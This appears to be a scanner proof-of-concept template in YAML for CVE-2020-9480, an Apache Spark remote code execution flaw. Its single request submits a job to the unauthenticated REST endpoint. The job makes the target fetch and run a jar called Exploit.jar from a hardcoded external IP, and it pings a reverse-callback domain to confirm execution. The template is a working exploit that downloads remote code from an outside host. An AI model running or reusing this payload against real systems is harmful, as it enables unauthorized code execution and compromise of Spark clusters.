name: poc-yaml-apache-spark-cve-2020-9480
transport: http
set:
  reverse: newReverse()
  reverseDomain: reverse.domain
rules:
  r0:
    request:
      method: POST
      path: /v1/submissions/create
      follow_redirects: false
      headers:
        Content-Type: application/json
      body: |-
        {
          "action": "CreateSubmissionRequest",
          "clientSparkVersion": "2.3.1",
          "appArgs": [
        "ping -c 3 {{reverseDomain}}"
          ],
          "appResource": "http://43.142.41.50:8002/UploadFiles/Exploit.jar",
          "environmentVariables": {
            "SPARK_ENV_LOADED": "1"
          },
          "mainClass": "Exploit",
          "sparkProperties": {
            "spark.jars": "http://43.142.41.50:8002/UploadFiles/Exploit.jar",
            "spark.driver.supervise": "false",
            "spark.app.name": "Exploit",
            "spark.eventLog.enabled": "true",
            "spark.submit.deployMode": "cluster",
            "spark.master": "spark://223.247.102.2:7077"
          }
        }
    expression: response.status == 200 && reverse.wait(5)
expression: r0()
detail:
  author: Secur1ty0(https://github.com/Secur1ty0)
  links:
    - https://blog.csdn.net/weixin_44047654/article/details/129817463
